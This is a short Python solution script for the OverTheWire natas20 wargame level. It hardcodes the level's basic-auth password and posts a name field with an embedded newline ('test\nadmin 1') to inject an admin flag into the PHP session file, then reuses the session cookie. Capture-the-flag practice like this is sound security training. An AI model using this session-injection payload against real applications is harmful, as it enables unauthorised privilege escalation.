import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas20.natas.labs.overthewire.org/index.php?debug=1'
response = ''
# base auth
auth = HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

# setup a new session
session = requests.Session()
data = {'name' : 'test\nadmin 1'}
response = session.post(url, data = data, auth = auth)
print(response.text)
sessionId = session.cookies.get_dict()['PHPSESSID']

cookies = {'PHPSESSID' : sessionId}
response = requests.get(url, auth = auth, cookies = cookies)
print(response.text)

